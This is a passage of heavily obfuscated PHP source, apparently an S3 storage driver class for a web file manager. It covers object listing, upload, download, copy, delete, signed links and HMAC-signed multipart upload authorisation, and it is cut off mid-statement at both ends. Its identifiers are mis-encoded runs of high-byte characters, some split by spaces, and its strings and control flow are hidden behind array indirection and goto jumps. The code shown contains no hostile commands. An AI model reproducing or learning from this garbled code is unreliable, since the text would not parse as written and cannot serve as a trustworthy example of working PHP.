isset($E¨¤‡‹Ã…§[$f¸ òêñ¶·[168]]) ? $E¨¤‡‹Ã…§[$f¸ òêñ¶·[168]] : http_type(); $B¿É“œ“ˆ = isset($E¨¤‡‹Ã…§[$f¸ òêñ¶·[169]]) ? $E¨¤‡‹Ã…§[$f¸ òêñ¶·[169]] : $E¨¤‡‹Ã…§[$f¸ òêñ¶·[75]]; if (isset($E¨¤‡‹Ã…§[$f¸ òêñ¶·[170]])) { $B¿É“œ“ˆ .= $f¸ òêñ¶·[4] . $E¨¤‡‹Ã…§[$f¸ òêñ¶·[170]]; } return $Eßìê«À´æ . $f¸ òêñ¶·[171] . $B¿É“œ“ˆ; } public function pathEncode($AÏ²Ù‚‹ë‰) { $DİÚ«¼§” =& $_SERVER[Æ]; return str_replace($DİÚ«¼§”[172], $DİÚ«¼§”[8], rawurlencode($AÏ²Ù‚‹ë‰)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($B‹‰Šï’Ü) { set_timeout(); require_once SDK_DIR . $_SERVER[Æ][173]; parent::__construct(); $this->_init($B‹‰Šï’Ü); } public function _init($e¤Şá”¹) { foreach ($e¤Şá”¹ as $BŞ™–™ë¡ => $c˜ÊòÙóØ) { if (isset($this->{$BŞ™–™ë¡})) { $this->{$BŞ™–™ë¡} = $c˜ÊòÙóØ; } } $this->endpoint = $e¤Şá”¹[$_SERVER[Æ][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C‘ÚÍ‡ß– = "\x76\64") { $this->signVer = $C‘ÚÍ‡ß–; $this->client->setSignatureVersion($C‘ÚÍ‡ß–); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dÔ‰à©á­ó; D¢öâÓÈŒ: $C†ğøÕïì° = array($b½¨Ø§É¦¤[180], $b½¨Ø§É¦¤[181], $b½¨Ø§É¦¤[182], $b½¨Ø§É¦¤[183], $b½¨Ø§É¦¤[184]); $bãÂ¶‹ŠŠ = array_diff($C†ğøÕïì°, $AÕ‡Ã²ÍŠ); return empty($bãÂ¶‹ŠŠ); goto DÓ½¼Š¹¶; eç®ªòÂ: if ($f¥ŒŒÍ§¥…[$b½¨Ø§É¦¤[175]] != $b½¨Ø§É¦¤[176] || $f¥ŒŒÍ§¥…[$b½¨Ø§É¦¤[177]] != $b½¨Ø§É¦¤[176]) { return !1; } $AÕ‡Ã²ÍŠ = array_map($b½¨Ø§É¦¤[178], $f¥ŒŒÍ§¥…[$b½¨Ø§É¦¤[179]]); if (!is_array($AÕ‡Ã²ÍŠ)) { $AÕ‡Ã²ÍŠ = array(); } goto D¢öâÓÈŒ; dÔ‰à©á­ó: $b½¨Ø§É¦¤ =& $_SERVER[Æ]; $f¥ŒŒÍ§¥… = $this->getBucketCors(); if (!$f¥ŒŒÍ§¥… || !is_array($f¥ŒŒÍ§¥…)) { return !1; } goto eç®ªòÂ; DÓ½¼Š¹¶: } public function mkfile($bÇí„Åˆ, $Cõ˜Ì‚¶Ğ = '', $F±š”‹Ø÷‡ = REPEAT_RENAME) { $B‚•°È²´Û = $this->setContent($bÇí„Åˆ, $Cõ˜Ì‚¶Ğ); if ($B‚•°È²´Û !== !1) { return $this->getPathOuter($bÇí„Åˆ); } return !1; } public function mkdir($aÇø¤ÆØ†Ü, $FïõÌ¥ŠŠ¯ = REPEAT_SKIP) { if (empty($aÇø¤ÆØ†Ü)) { return !1; } if ($this->_isFolder($aÇø¤ÆØ†Ü)) { return $this->getPathOuter($aÇø¤ÆØ†Ü); } $E„Û„”¹ˆ‚ = $this->setContent($aÇø¤ÆØ†Ü, $_SERVER[Æ][33], !0); if ($E„Û„”¹ˆ‚ !== !1) { return $this->getPathOuter($aÇø¤ÆØ†Ü); } return !1; } public function copyFile($D„³Õ§‰“, $f‡¨©àÌ¼, $C˜ÒïøÙ³£ = array()) { $ağ ˆ©àÌï =& $_SERVER[Æ]; $bÕ’¬øäéä = $this->objectMeta($D„³Õ§‰“); if (!$bÕ’¬øäéä) { return !1; } if ($bÕ’¬øäéä[$ağ ˆ©àÌï[77]] <= 1024 * 1024 * 200) { $bÎ±’ù–¸£ = $this->client->copyObject($this->bucket, $D„³Õ§‰“, $this->bucket, $f‡¨©àÌ¼, $ağ ˆ©àÌï[185], $C˜ÒïøÙ³£); } else { $bÎ±’ù–¸£ = $this->client->multiCopyObject($this->bucket, $D„³Õ§‰“, $this->bucket, $f‡¨©àÌ¼, $C˜ÒïøÙ³£); } $bÎ±’ù–¸£ = $bÎ±’ù–¸£ ? $this->getPathOuter($f‡¨©àÌ¼) : !1; return $bÎ±’ù–¸£; } public function moveFile($FéŞ¥¿‰, $d«Õ¡Ïµ³î) { if ($this->copyFile($FéŞ¥¿‰, $d«Õ¡Ïµ³î)) { $this->delFile($FéŞ¥¿‰); return $this->getPathOuter($d«Õ¡Ïµ³î); } return !1; } public function delFile($dòÈ“ŒœÁÖ) { return $this->client->deleteObject($this->bucket, $dòÈ“ŒœÁÖ); } public function delFolder($B®‡¹ëŠâ£) { goto bá—ÏÈ®; FÃ«ß•½ºë: $aö’³ÏòÏ¬ = $fÒì¡£³Ù = 0; $fç¤¸Ô‰Ô = array_chunk(array_keys($AÔÓø±š˜Ù), 1000); foreach ($fç¤¸Ô‰Ô as $C¨¹–’î“) { $aö’³ÏòÏ¬++; $fÒì¡£³Ù += (int) $this->client->deleteObjects($this->bucket, $C¨¹–’î“); } goto eÍÕìİ™®•; bá—ÏÈ®: $dîæÙÅøç” =& $_SERVER[Æ]; $AÔÓø±š˜Ù = $this->listObjs($B®‡¹ëŠâ£); if (!$AÔÓø±š˜Ù) { $B®‡¹ëŠâ£ = trim($B®‡¹ëŠâ£, $dîæÙÅøç”[8]); if (!empty($B®‡¹ëŠâ£)) { $B®‡¹ëŠâ£ .= $dîæÙÅøç”[8]; } return $this->delFile($B®‡¹ëŠâ£); } goto FÃ«ß•½ºë; eÍÕìİ™®•: return $aö’³ÏòÏ¬ === $fÒì¡£³Ù ? !0 : !1; goto bìÇ—Ùì’º; bìÇ—Ùì’º: } public function rename($BÄÇÑÔ¡Ÿ¼, $cê£ò¼–¨¡) { return $this->renameObject($BÄÇÑÔ¡Ÿ¼, $cê£ò¼–¨¡); } public function listPath($C‘²“¿˜×‘, $Bá¾Å¯’ô“ = false) { $fØÙ¯‹èğˆ =& $_SERVER[Æ]; $FòŠšÆƒÆÀ = $this->listObjs($C‘²“¿˜×‘, null, null, $fØÙ¯‹èğˆ[8]); $Aïî„‚Ÿíä = array($fØÙ¯‹èğˆ[74] => array(), $fØÙ¯‹èğˆ[73] => array()); foreach ($FòŠšÆƒÆÀ as $Cˆ™ƒ¢áŒ => $AšÑŒÕ–…) { if ($Cˆ™ƒ¢áŒ == $fØÙ¯‹èğˆ[8]) { continue; } if (isset($AšÑŒÕ–…[$fØÙ¯‹èğˆ[186]])) { $Aïî„‚Ÿíä[$fØÙ¯‹èğˆ[74]][] = $this->folderInfo($AšÑŒÕ–…[$fØÙ¯‹èğˆ[186]], $Bá¾Å¯’ô“); } else { if (substr($AšÑŒÕ–…[$fØÙ¯‹èğˆ[28]], -1) == $fØÙ¯‹èğˆ[8]) { continue; } $Aïî„‚Ÿíä[$fØÙ¯‹èğˆ[73]][] = $this->fileInfo($AšÑŒÕ–…[$fØÙ¯‹èğˆ[28]], $Bá¾Å¯’ô“, $AšÑŒÕ–…); } } return $Aïî„‚Ÿíä; } private function fileInfo($aÛï³Œ¥‹, $c²“ñ²¬°Õ = false, $D¤ÎÉÈ¾´‡ = array()) { goto eÒºßÜ‰Ë•; dÈÈ¦‹Ï“Ğ: if (empty($D¤ÎÉÈ¾´‡)) { $D¤ÎÉÈ¾´‡ = $this->objectMeta($aÛï³Œ¥‹); if (!$D¤ÎÉÈ¾´‡) { return $dµ¯à¬ˆ“; } } if (isset($D¤ÎÉÈ¾´‡[$A–Òï¤™Â£[190]])) { $dµ¯à¬ˆ“[$A–Òï¤™Â£[107]] = $D¤ÎÉÈ¾´‡[$A–Òï¤™Â£[190]]; } if (isset($D¤ÎÉÈ¾´‡[$A–Òï¤™Â£[77]])) { $dµ¯à¬ˆ“[$A–Òï¤™Â£[77]] = $D¤ÎÉÈ¾´‡[$A–Òï¤™Â£[77]]; } goto b•ß‰÷‡÷; b•ß‰÷‡÷: return $dµ¯à¬ˆ“; goto b‘†‡Ú§­Ì; eÒºßÜ‰Ë•: $A–Òï¤™Â£ =& $_SERVER[Æ]; if ($c²“ñ²¬°Õ) { return array($A–Òï¤™Â£[28] => $this->pathThis($aÛï³Œ¥‹), $A–Òï¤™Â£[75] => $this->getPathOuter($aÛï³Œ¥‹), $A–Òï¤™Â£[29] => $A–Òï¤™Â£[167], $A–Òï¤™Â£[160] => $this->ext($aÛï³Œ¥‹), $A–Òï¤™Â£[77] => isset($D¤ÎÉÈ¾´‡[$A–Òï¤™Â£[77]]) ? $D¤ÎÉÈ¾´‡[$A–Òï¤™Â£[77]] : 0, $A–Òï¤™Â£[187] => 0, $A–Òï¤™Â£[107] => 0, $A–Òï¤™Â£[188] => !0, $A–Òï¤™Â£[189] => !0); } $dµ¯à¬ˆ“ = array($A–Òï¤™Â£[28] => $this->pathThis($aÛï³Œ¥‹), $A–Òï¤™Â£[75] => $this->getPathOuter($aÛï³Œ¥‹), $A–Òï¤™Â£[29] => $A–Òï¤™Â£[167], $A–Òï¤™Â£[187] => 0, $A–Òï¤™Â£[107] => 0, $A–Òï¤™Â£[77] => 0, $A–Òï¤™Â£[160] => $this->ext($aÛï³Œ¥‹), $A–Òï¤™Â£[188] => !0, $A–Òï¤™Â£[189] => !0); goto dÈÈ¦‹Ï“Ğ; b‘†‡Ú§­Ì: } private function folderInfo($C…ÍğÌßù, $CÉøëµˆŸ = false) { goto aÛ«à Í°Ğ; aÛ«à Í°Ğ: $dëññ„†‡ =& $_SERVER[Æ]; if ($CÉøëµˆŸ) { return array($dëññ„†‡[28] => $this->pathThis($C…ÍğÌßù), $dëññ„†‡[75] => $this->getPathOuter($dëññ„†‡[8] . $C…ÍğÌßù), $dëññ„†‡[29] => $dëññ„†‡[76], $dëññ„†‡[188] => !0, $dëññ„†‡[189] => !0); } $d•Ò˜•Ã‘ = array($dëññ„†‡[28] => $this->pathThis($C…ÍğÌßù), $dëññ„†‡[75] => $this->getPathOuter($dëññ„†‡[8] . $C…ÍğÌßù), $dëññ„†‡[29] => $dëññ„†‡[76], $dëññ„†‡[187] => 0, $dëññ„†‡[107] => 0, $dëññ„†‡[188] => !0, $dëññ„†‡[189] => !0); goto A—ÆØø ç; A—ÆØø ç: if ($C…ÍğÌßù == $dëññ„†‡[33]) { return $d•Ò˜•Ã‘; } $C…ÍğÌßù = trim($C…ÍğÌßù, $dëññ„†‡[8]) . $dëññ„†‡[8]; $E‡òÓ®¦¢° = $this->objectMeta($C…ÍğÌßù); goto BÖ’½îô¤…; BÖ’½îô¤…: if (isset($E‡òÓ®¦¢°[$dëññ„†‡[190]])) { $d•Ò˜•Ã‘[$dëññ„†‡[187]] = $E‡òÓ®¦¢°[$dëññ„†‡[190]]; } return $d•Ò˜•Ã‘; goto d’†ß³Ï–Õ; d’†ß³Ï–Õ: } public function listObjs($D²²øÈ›Î, $bÄ†ÊˆªµŒ = null, $dçî§ÙÌÙ = null, $fòø—Äğ­È = null) { $e¡À‚í¦…Ñ =& $_SERVER[Æ]; $D²²øÈ›Î = trim($D²²øÈ›Î, $e¡À‚í¦…Ñ[8]); $AŠ›µ¤Ñ‰ = empty($D²²øÈ›Î) ? $e¡À‚í¦…Ñ[33] : $D²²øÈ›Î . $e¡À‚í¦…Ñ[8]; return $this->client->getBucket($this->bucket, $AŠ›µ¤Ñ‰, $bÄ†ÊˆªµŒ, $dçî§ÙÌÙ, $fòø—Äğ­È, !0); } public function has($cÌ£ÛÒñˆ, $d Ğƒµ—à÷ = false, $fğö‘â°Ûó = true) { goto bÜ„öå‡º„; bÜ„öå‡º„: $CœŸÙí®¹Õ =& $_SERVER[Æ]; $AÛĞ­¸ôÚÜ = 0; $b×‡‰´àˆŸ = 0; goto eÊ’ğÕÀ¸ˆ; BÆäŒ™î† : if ($d Ğƒµ—à÷) { return array($CœŸÙí®¹Õ[191] => $AÛĞ­¸ôÚÜ, $CœŸÙí®¹Õ[192] => $b×‡‰´àˆŸ); } return !1; goto Eô¦¦÷‰ŠÄ; eÊ’ğÕÀ¸ˆ: $BèŞ„„Ë = $this->listObjs($cÌ£ÛÒñˆ, null, null, $CœŸÙí®¹Õ[8]); $BèŞ„„Ë = is_array($BèŞ„„Ë) ? $BèŞ„„Ë : array(); foreach ($BèŞ„„Ë as $E¬ŠÛ¦óÄË) { if (isset($E¬ŠÛ¦óÄË[$CœŸÙí®¹Õ[28]]) && substr($E¬ŠÛ¦óÄË[$CœŸÙí®¹Õ[28]], -1) != $CœŸÙí®¹Õ[8]) { if (!$d Ğƒµ—à÷ && $fğö‘â°Ûó) { return !0; } $AÛĞ­¸ôÚÜ++; } else { if (isset($E¬ŠÛ¦óÄË[$CœŸÙí®¹Õ[186]])) { if (!$d Ğƒµ—à÷ && !$fğö‘â°Ûó) { return !1; } $b×‡‰´àˆŸ++; } } } goto BÆäŒ™î† ; Eô¦¦÷‰ŠÄ: } public function listAll($dîùÖò­¶½) { $A¯³óÉ»¿ =& $_SERVER[Æ]; $E”­¶«†Ë¥ = $this->listObjs($dîùÖò­¶½); $AŞçªé«…’ = $a»Åö’³÷Ÿ = array(); foreach ($E”­¶«†Ë¥ as $F’ÃˆÍƒÍ† => $EÜÜæÚ®»…) { $AŞçªé«…’[] = $EÜÜæÚ®»…[$A¯³óÉ»¿[28]]; $a»Åö’³÷Ÿ[$F’ÃˆÍƒÍ†] = $EÜÜæÚ®»…[$A¯³óÉ»¿[77]]; } return $this->listAllFiles($dîùÖò­¶½, $AŞçªé«…’, $a»Åö’³÷Ÿ); } public function canRead($Dì›æÌ¿¿) { $EÀÎÌæ£ÃÚ =& $_SERVER[Æ]; $dçÒí±ò‘• = $this->client->getAccessControlPolicy($this->bucket, $Dì›æÌ¿¿); if (!$dçÒí±ò‘•) { return !1; } return in_array($dçÒí±ò‘•, array($EÀÎÌæ£ÃÚ[193], $EÀÎÌæ£ÃÚ[194], $EÀÎÌæ£ÃÚ[195])) ? !0 : !1; } public function canWrite($E£Àµ‡ŞÍİ) { $Eˆ¿ÖšŠÁñ =& $_SERVER[Æ]; $BµÀê÷±‡± = $this->client->getAccessControlPolicy($this->bucket, $E£Àµ‡ŞÍİ); if (!$BµÀê÷±‡±) { return !1; } return in_array($BµÀê÷±‡±, array($Eˆ¿ÖšŠÁñ[193], $Eˆ¿ÖšŠÁñ[194])) ? !0 : !1; } public function getContent($e¢¾ì„äØ§) { return $this->client->getObject($this->bucket, $e¢¾ì„äØ§); } public function setContent($e½»ÂÃù‹, $A«¨İ§®œ° = '', $Bé°ó‘“é = false) { goto cŠ‚å»‘Ù; cŠ‚å»‘Ù: $b¤‚±ôŒâ† =& $_SERVER[Æ]; $e½»ÂÃù‹ = $Bé°ó‘“é ? trim($e½»ÂÃù‹, $b¤‚±ôŒâ†[8]) . $b¤‚±ôŒâ†[8] : $e½»ÂÃù‹; $b³ÁéÄâš¾ = get_file_mime(get_path_ext($e½»ÂÃù‹)); goto EğÄÎœ¢š¨; f…ˆëø¦ó†: $D¨±Çƒ¨Õµ = $this->copyFile($e½»ÂÃù‹, $e½»ÂÃù‹, array($b¤‚±ôŒâ†[196] => $D¨±Çƒ¨Õµ[$b¤‚±ôŒâ†[197]])); return $D¨±Çƒ¨Õµ ? !0 : !1; goto CŒÖì×ŠÁÃ; EğÄÎœ¢š¨: $D¨±Çƒ¨Õµ = $this->client->putObject($A«¨İ§®œ°, $this->bucket, $e½»ÂÃù‹, $b¤‚±ôŒâ†[185], array(), $b³ÁéÄâš¾); if (!$D¨±Çƒ¨Õµ) { return !1; } if ($Bé°ó‘“é) { return !0; } goto f…ˆëø¦ó†; CŒÖì×ŠÁÃ: } public function fileSubstr($eáŠÙ®èƒƒ, $eíñ·™¶­, $E½öÀ˜Ö®ñ) { $A«š„¬‘‘Ù = $eíñ·™¶­ + $E½öÀ˜Ö®ñ - 1; return $this->client->getObject($this->bucket, $eáŠÙ®èƒƒ, array($_SERVER[Æ][198] => "\142\171\164\145\x73\x3d{$eíñ·™¶­}\55{$A«š„¬‘‘Ù}")); } public function upload($dğ‘–« ¹¨, $c¸¡œŠì‹, $E—ä–ğ¬œ = false, $dåë«‡ù“• = REPEAT_REPLACE) { $bÄĞòõ¸Úª =& $_SERVER[Æ]; $e‘¨ïª = array($bÄĞòõ¸Úª[196] => @md5_file($c¸¡œŠì‹)); $f½îµáÈÃ = array($bÄĞòõ¸Úª[199] => get_file_mime(get_path_ext($dğ‘–« ¹¨))); if (IO::size($c¸¡œŠì‹) <= 1024 * 1024 * 200) { $FŸ‚†½Ü‹ˆ = $this->client->putObjectFile($c¸¡œŠì‹, $this->bucket, $dğ‘–« ¹¨, $bÄĞòõ¸Úª[185], $e‘¨ïª, $f½îµáÈÃ); return !empty($FŸ‚†½Ü‹ˆ) ? $this->getPathOuter($dğ‘–« ¹¨) : !1; } $D¦Ÿ§ÖÍ­ = $this->client->multiUploadObject($c¸¡œŠì‹, $this->bucket, trim($dğ‘–« ¹¨, $bÄĞòõ¸Úª[8]), $e‘¨ïª, $f½îµáÈÃ); return $D¦Ÿ§ÖÍ­ ? $this->getPathOuter($dğ‘–« ¹¨) : !1; } public function download($A±Â²‘ÓŒÀ, $C·À¹Ÿ®Â) { if (!@is_dir($this->pathFather($C·À¹Ÿ®Â)) && !IO::mkdir($this->pathFather($C·À¹Ÿ®Â))) { return !1; } $DÊÓ±ùÓÇÙ = $this->client->getObject($this->bucket, $A±Â²‘ÓŒÀ, array(), $C·À¹Ÿ®Â); return $DÊÓ±ùÓÇÙ !== !1 ? $C·À¹Ÿ®Â : !1; } public function link($A™Ó‹„¼™, $FÄ¿š«»”Š = array()) { $cİ›½—À¹ =& $_SERVER[Æ]; if ($this->signVer == $cİ›½—À¹[200]) { return $this->client->getAuthenticatedURL($this->bucket, $A™Ó‹„¼™, 3600 * 12, $FÄ¿š«»”Š); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($A™Ó‹„¼™, $cİ›½—À¹[8]), 3600 * 12, $this->region, array(), !0, $FÄ¿š«»”Š); } public function fileOut($cØ•‰ëæí“, $BÈù„ãÈ¾Ï = false, $dØµã†µÖ = false, $câ¡Œ×–™Û = '') { goto E×½œ”İ¨â; aïè¿ÔÉ¸î: $c‘²’³Ìöù = $this->link($cØ•‰ëæí“, $a²‚‘É”¼¼); $this->fileOutLink($c‘²’³Ìöù); goto FÅ·ÜÛİÍ; eŒ¢›îÖÚ™: if ($Aæ¡éÇÚ‚¡ == $a¨¤¬¸É©İ[201]) { return parent::fileOut($cØ•‰ëæí“, $BÈù„ãÈ¾Ï, $dØµã†µÖ, $câ¡Œ×–™Û); } $BÈù„ãÈ¾Ï = $BÈù„ãÈ¾Ï ? $a¨¤¬¸É©İ[202] : $a¨¤¬¸É©İ[203]; $a²‚‘É”¼¼ = array($a¨¤¬¸É©İ[204] => $BÈù„ãÈ¾Ï . $a¨¤¬¸É©İ[205] . rawurlencode($dØµã†µÖ), $a¨¤¬¸É©İ[206] => $Aæ¡éÇÚ‚¡); goto aïè¿ÔÉ¸î; E×½œ”İ¨â: $a¨¤¬¸É©İ =& $_SERVER[Æ]; if (!$dØµã†µÖ) { $dØµã†µÖ = $this->pathThis($cØ•‰ëæí“); } $Aæ¡éÇÚ‚¡ = get_file_mime(get_path_ext($dØµã†µÖ)); goto eŒ¢›îÖÚ™; FÅ·ÜÛİÍ: } public function fileOutServer($A™õ ª•éµ, $e“êßØ¯‚ä = false, $Fù¯¥œòØó = false, $f›ƒøäôÔË = '') { parent::fileOut($A™õ ª•éµ, $e“êßØ¯‚ä, $Fù¯¥œòØó, $f›ƒøäôÔË); } public function fileOutImage($FöáœŠ„Ş, $aµÃÉ¸•İ¶ = 250) { $dø¶¦ô±°ö = $this->link($FöáœŠ„Ş); $this->fileOutLink($dø¶¦ô±°ö); } public function fileOutImageServer($BÆÃù®ÈƒŒ, $B±ƒØÛ‰Ü  = 250) { parent::fileOutImage($BÆÃù®ÈƒŒ, $B±ƒØÛ‰Ü ); } public function hashMd5($Eçœñ¬Î£„, $b¨œ¾ë¥©§ = '') { $F£ŸŒ¨ôâå =& $_SERVER[Æ]; $CÙÌÎ‡‰Ï» = $this->objectMeta($Eçœñ¬Î£„); if (!$CÙÌÎ‡‰Ï») { return !1; } $b¨œ¾ë¥©§ = $b¨œ¾ë¥©§ ? $b¨œ¾ë¥©§ : _get($CÙÌÎ‡‰Ï», $F£ŸŒ¨ôâå[207]); $b¨œ¾ë¥©§ = $b¨œ¾ë¥©§ ? $b¨œ¾ë¥©§ : _get($CÙÌÎ‡‰Ï», $F£ŸŒ¨ôâå[197], $F£ŸŒ¨ôâå[33]); return $b¨œ¾ë¥©§; } public function uploadFormData($cÆ½ÛœÒĞ, $F‰³‰Ğ°Ù– = 3600) { $FÎÌï›ø–™ =& $_SERVER[Æ]; $b‰Õ‹â¢¿– = $this->pathFather($cÆ½ÛœÒĞ); $DØÚŠŒÛ¸Ğ = $this->client->getHttpUploadPostParams($this->bucket, $b‰Õ‹â¢¿–, $FÎÌï›ø–™[185], $F‰³‰Ğ°Ù–); return array_merge((array) $DØÚŠŒÛ¸Ğ, array($FÎÌï›ø–™[169] => $this->getHost())); } public function multiUploadFormData($E›šèÅÓí, $dŸ¸Šö‹‰” = 3600) { $Cˆç‡Ûâ‹é =& $_SERVER[Æ]; $Eê‚¢Ñˆ… = gmdate($Cˆç‡Ûâ‹é[208]); $fóî¨îæ†² = array(); $D’À¯ğŒêò = $this->client->getUploadId($this->bucket, $E›šèÅÓí, $fóî¨îæ†²); if (!$D’À¯ğŒêò) { return !1; } return array($Cˆç‡Ûâ‹é[209] => $D’À¯ğŒêò, $Cˆç‡Ûâ‹é[169] => $this->getHost() . $Cˆç‡Ûâ‹é[8] . $this->pathEncode($E›šèÅÓí), $Cˆç‡Ûâ‹é[210] => $Eê‚¢Ñˆ…, $Cˆç‡Ûâ‹é[89] => $E›šèÅÓí); } public function multiUploadAuthData($E’Û²Ø”Ù, $DÊÈ¬êÁ³ = array()) { goto cÜ·•‰¯Ú»; cÜ·•‰¯Ú»: $bÏˆ¹³ğ­¯ =& $_SERVER[Æ]; $F°Ââ‹Á° = isset($DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[210]]) ? $DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[210]] : gmdate($bÏˆ¹³ğ­¯[208]); $CÈšÜ‚¸å = isset($DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[160]]) ? $DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[160]] : $bÏˆ¹³ğ­¯[33]; goto B´Ó²æŞ¿Š; a©œæ®¶Ç†: $FŞ‡ùø”éä = array($bÏˆ¹³ğ­¯[212], $bÏˆ¹³ğ­¯[33], $bÏˆ¹³ğ­¯[116], $bÏˆ¹³ğ­¯[33], "\x78\55\x61\x6d\x7a\x2d\144\x61\x74\x65\x3a{$F°Ââ‹Á°}", $bÏˆ¹³ğ­¯[8] . $this->bucket . $bÏˆ¹³ğ­¯[8] . $this->pathEncode($dõ“‹è§–ø) . $CÈšÜ‚¸å); if (strpos($CÈšÜ‚¸å, $bÏˆ¹³ğ­¯[213]) === 0) { $FŞ‡ùø”éä[0] = $bÏˆ¹³ğ­¯[214]; } if (isset($DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[215]]) && $DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[215]] == $bÏˆ¹³ğ­¯[216]) { $FŞ‡ùø”éä[0] = $bÏˆ¹³ğ­¯[216]; } goto CİÛçÆçæ; B´Ó²æŞ¿Š: $dõ“‹è§–ø = $DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[89]]; unset($DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[89]]); if (isset($DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[211]])) { $DÊÈ¬êÁ³[$bÏˆ¹³ğ­¯[210]] = $F°Ââ‹Á°; return $this->listUploadParts($dõ“‹è§–ø, $DÊÈ¬êÁ³); } goto a©œæ®¶Ç†; CİÛçÆçæ: $d¤ãßç Íğ = implode($bÏˆ¹³ğ­¯[217], $FŞ‡ùø”éä); $Dƒî÷­¾Õ = base64_encode(hash_hmac($bÏˆ¹³ğ­¯[218], $d¤ãßç Íğ, $this->secret, !0)); $B‚ÆÃŠÑ¡£ = $bÏˆ¹³ğ­¯[219] . $this->accessKey . $bÏˆ¹³ğ­¯[4] . $Dƒî÷­¾Õ; goto dÊÓ”¨ñ”‡; dÊÓ”¨ñ”‡: if (strpos($CÈšÜ‚¸å, $bÏˆ¹³ğ­¯[213]) === 0) { return array($bÏˆ¹³ğ­¯[220] => $B‚ÆÃŠÑ¡£, $bÏˆ¹³ğ­¯[210] => $F°Ââ‹Á°); } return $B‚ÆÃŠÑ¡£; goto d¥×¢‚¿¤å; d¥×¢‚¿¤å: } public function listUploadParts($EÑƒ†ä–ù–, $eÂù¼Úâ¼º = array()) { goto cÈ™´÷õ«ñ; D°…‹±îè‡: if (!$C³º©…ó–ƒ) { return !1; } unset($eÂù¼Úâ¼º[$bÆÚŒ ·Ñ÷[211]], $eÂù¼Úâ¼º[$bÆÚŒ ·Ñ÷[215]]); $eÂù¼Úâ¼º[$bÆÚŒ ·Ñ÷[89]] = $EÑƒ†ä–ù–; goto báÕ¡³¯˜; cÈ™´÷õ«ñ: $bÆÚŒ ·Ñ÷ =& $_SERVER[Æ]; $fœ°†ÔÆµ“ = str_replace($bÆÚŒ ·Ñ÷[221], $bÆÚŒ ·Ñ÷[33], $eÂù¼Úâ¼º[$bÆÚŒ ·Ñ÷[160]]); $C³º©…ó–ƒ = $this->client->listParts($this->bucket, $EÑƒ†ä–ù–, $fœ°†ÔÆµ“); goto D°…‹±îè‡; báÕ¡³¯˜: $FÄøƒ¨–¾® = $this->multiUploadAuthData($EÑƒ†ä–ù–, $eÂù¼Úâ¼º); if (empty($FÄøƒ¨–¾®)) { return !1; } return array($bÆÚŒ ·Ñ÷[220] => $FÄøƒ¨–¾®, $bÆÚŒ ·Ñ÷[210] => $eÂù¼Úâ¼º[$bÆÚŒ ·Ñ÷[210]], $bÆÚŒ ·Ñ÷[222] => $C³º©…ó–ƒ); goto dĞİÑÚ¦—; dĞİÑÚ¦—: } public function getHost() { return parent::getHost() . $_SERVER[Æ][8] . $this->bucket; } public function size($AöÏ¿¬ø‘Ø) { $f½†·Ùäç° = $this->objectMeta($AöÏ¿¬ø‘Ø); return $f½†·Ùäç° ? $f½†·Ùäç°[$_SERVER[Æ][77]] : 0; } public function info($Dãì”ù›†Ğ) { if ($this->isFolder($Dãì”ù›†Ğ)) { return $this->folderInfo($Dãì”ù›†Ğ); } else { if ($this->isFile($Dãì”ù›†Ğ)) { return $this->fileInfo($Dãì”ù›†Ğ); } } return !1; } public function exist($d®¬Ğ¦…ô÷) { return $this->isFile($d®¬Ğ¦…ô÷) || $this->isFolder($d®¬Ğ¦…ô÷); } public function isFile($e¸İ²šßïˆ) { return !$this->isFolder($e¸İ²šßïˆ) && $this->objectMeta($e¸İ²šßïˆ); } public function isFolder($a™ÈÃôÅŠ†) { return $this->cacheMethod($_SERVER[Æ][223], $a™ÈÃôÅŠ†); } protected function objectMeta($EÓ¦Ì•ÃÜ) { return $this->cacheMethod($_SERVER[Æ][224], $EÓ¦Ì•ÃÜ); } protected function _objectMeta($fƒç¸ÚÇØ©) { $c§ä¾åÁöí =& $_SERVER[Æ]; $fƒç¸ÚÇØ© = rtrim($fƒç¸ÚÇØ©, $c§ä¾åÁöí[8]); try { $dÛÂï÷ƒ‹È = $this->client->getObjectInfo($this->bucket, $fƒç¸ÚÇØ©); if (!isset($dÛÂï÷ƒ‹È[$c§ä¾åÁöí[207]]) && isset($dÛÂï÷ƒ‹È[$c§ä¾åÁöí[225]])) { $dÛÂï÷ƒ‹È[$c§ä¾åÁöí[207]] = $dÛÂï÷ƒ‹È[$c§ä¾åÁöí[225]]; } } catch (OSS\Core\OssException $F¬ŸôŸÎ) { $dÛÂï÷ƒ‹È = !1; } if (!$dÛÂï÷ƒ‹È) { } return $dÛÂï÷ƒ‹È; } protected function _isFolder($C˜¯òñÀê) { goto eğñŸò´çÜ; b¢ÇÎ¾Ö´Ï: if (substr($C³†¯ÊÂİŞ[0][$fŠ‰¬É´½Ï[28]], -1) == $fŠ‰¬É´½Ï[8]) { return !0; } if (get_path_this($C³†¯ÊÂİŞ[0][$fŠ‰¬É´½Ï[28]]) == get_path_this($C˜¯òñÀê)) { return !1; } return !0; goto fºöëÍÆô©; eğñŸò´çÜ: $fŠ‰¬É´½Ï =& $_SERVER[Æ]; $C˜¯òñÀê = rtrim($C˜¯òñÀê, $fŠ‰¬É´½Ï[8]); if ($C˜¯òñÀê == $fŠ‰¬É´½Ï[33] || $C˜¯òñÀê == $fŠ‰¬É´½Ï[8]) { return !0; } goto A’İÆÌÁƒ; A’İÆÌÁƒ: $C³†¯ÊÂİŞ = $this->client->getBucket($this->bucket, $C˜¯òñÀê, null, 1); if 